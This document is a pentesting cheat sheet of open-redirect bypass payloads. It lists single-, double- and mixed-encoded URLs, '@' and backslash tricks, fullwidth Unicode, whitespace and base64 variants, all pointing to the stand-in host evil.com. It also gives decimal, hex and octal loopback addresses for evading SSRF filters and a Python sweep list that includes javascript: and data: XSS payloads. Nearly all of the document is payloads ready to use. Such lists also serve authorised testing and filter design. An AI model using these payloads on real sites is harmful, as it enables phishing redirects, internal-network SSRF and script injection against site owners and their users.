# Encoding attacks — the decode-order and multi-layer bypasses

## The model — the filter checks ONE decode stage

```text
the param arrives ENCODED -> the filter checks it at some decode stage
   -> the URL reaches the browser at a DIFFERENT decode stage
the bypass is the string whose encoded form passes the check but whose
decoded form resolves to the attacker host.
```

## The single-decode bypasses

| The check stage | The payload | The resolution |
|---|---|---|
| the raw param | `https%3a%2f%2fevil.com` | decodes to `https://evil.com` |
| the raw param | `https%3a//evil.com` | partial-decode — `https:` decodes, `//` stays |
| the raw param | `%2f%2fevil.com` | `//evil.com` |
| the raw param | `%5c%5cevil.com` | `\\evil.com` — the backslash-UNC |
| the raw param | `%2f%5cevil.com` | `/\evil.com` |
| the raw param | `https%3a%2f%2fevil.com%5c.target.com` | `https://evil.com\.target.com` |
| the raw param | `https%3a%2f%2fevil.com%40target.com` | `https://evil.com@target.com` — the `@` userinfo |
| the raw param | `https%3a%2f%2fevil.com%23target.com` | `https://evil.com#target.com` |
| the raw param | `https%3a%2f%2fevil.com%3ftarget.com` | `https://evil.com?target.com` |

## The double-decode bypasses

```text
the server decodes TWICE (a urldecode + a framework decode):
%252f -> %2f -> /        -> the double-encoded //
%255c -> %5c -> \        -> the double-encoded \
%253a -> %3a -> :        -> the double-encoded :
%252f%252f -> %2f%2f -> //  -> //evil.com
```

| The payload | Decode 1 | Decode 2 | Resolution |
|---|---|---|---|
| `https%253a%252f%252fevil.com` | `https%3a%2f%2fevil.com` | `https://evil.com` | `evil.com` |
| `%252f%252fevil.com` | `%2f%2fevil.com` | `//evil.com` | `evil.com` |
| `%255c%255cevil.com` | `%5c%5cevil.com` | `\\evil.com` | `evil.com` |
| `https%253a%252f%252fevil.com%2540target.com` | `https%3a%2f%2fevil.com%40target.com` | `https://evil.com@target.com` | `target.com` |

## The mixed-encode bypasses — the filter misses one layer

```text
%2fevil.com    -> a single-encoded /
%252fevil.com  -> a double-encoded /
%25252fevil.com-> a triple-encoded /
/%2fevil.com   -> a mix
/%252fevil.com -> a mix
%2f%5cevil.com -> a / + \
```

## The `+`-as-space bypasses

```text
the check sees `+`, the decoder reads ` `:
https%3a%2f%2fevil.com%20%40target.com -> `https://evil.com @target.com`
https://evil.com%2f%3f%40target.com    -> `https://evil.com/?@target.com`
```

## The unicode/fullwidth bypasses

```text
the filter checks ASCII; the browser decodes a fullwidth/multi-byte:
%ef%bc%8f = ／ (fullwidth /)   -> https:%ef%bc%8f%ef%bc%8fevil.com
%ef%bc%8e = ． (fullwidth .)   -> https://evil%ef%bc%8ecom
%ef%bc%a0 = ＠ (fullwidth @)   -> https://evil%ef%bc%a0target.com
%ef%bc%83 = ＃ (fullwidth #)   -> https://evil.com%ef%bc%83target.com
%ef%bc%9f = ？ (fullwidth ?)   -> https://evil.com%ef%bc%9ftarget.com
```

## The case/whitespace bypasses

```text
HTTPS://evil.com     -> case — a case-sensitive startswith check
  https://evil.com   -> leading whitespace — a trim-gap
https://evil.com%20  -> trailing whitespace
%20https://evil.com  -> leading encoded-space
\thttps://evil.com   -> a tab
```

## The base64-decoded param

```text
the param is b64-decoded BEFORE the check:
?next=aHR0cHM6Ly9ldmlsLmNvbQ==        -> https://evil.com
?next=Ly9ldmlsLmNvbQ==                 -> //evil.com
?next=aHR0cHM6Ly90YXJnZXQuY29tLmV2aWwuY29t  -> https://target.com.evil.com
```

## The decimal/hex IP forms — the host is numeric

```text
http://2130706433/    -> http://127.0.0.1/ (decimal)
http://0x7f000001/    -> http://127.0.0.1/ (hex)
http://0177.0.0.1/    -> http://127.0.0.1/ (octal)
http://127.1/         -> http://127.0.0.1/ (short-form)
http://evil.com/127.0.0.1 -> the decimal IP in the path
```

For the open-redirect itself the numeric form rarely helps (the host is
still attacker-controlled), but for the SSRF-chain the decimal/hex/octal
IP bypasses an IP-literal filter on the fetcher's URL.

## The encode-vs-parse arm matrix

```python
# the arms to sweep — the encode × parse-boundary matrix
ARMS = [
  'https://evil.com', '//evil.com', '/\\evil.com', '\\\\evil.com',
  '/%5cevil.com', '%5c%5cevil.com', 'https:/\\evil.com',
  'https:%2f%2fevil.com', '%2f%2fevil.com', 'https%3a%2f%2fevil.com',
  'https%253a%252f%252fevil.com',  # double
  'https://target.com@evil.com', 'https://evil.com%40target.com',
  'https://evil.com%5c.target.com', 'https://evil.com%40target.com',
  'https://evil.com#@target.com', 'https://evil.com?@target.com',
  'https://target.com.evil.com', 'https://evil.com/target.com',
  'https://evil.com?target.com', 'https://evil.com#target.com',
  'javascript:alert(1)', 'data:text/html,<script>alert(1)</script>',
  'https://evil.com%ef%bc%8f%ef%bc%8ftarget.com',  # fullwidth //
]
```

## The encode-record

`encode: <the-payload>: <the-decode-stage>: <the-parsed-host>` — each
encoded arm + the stage the filter checks + the host the browser resolves.
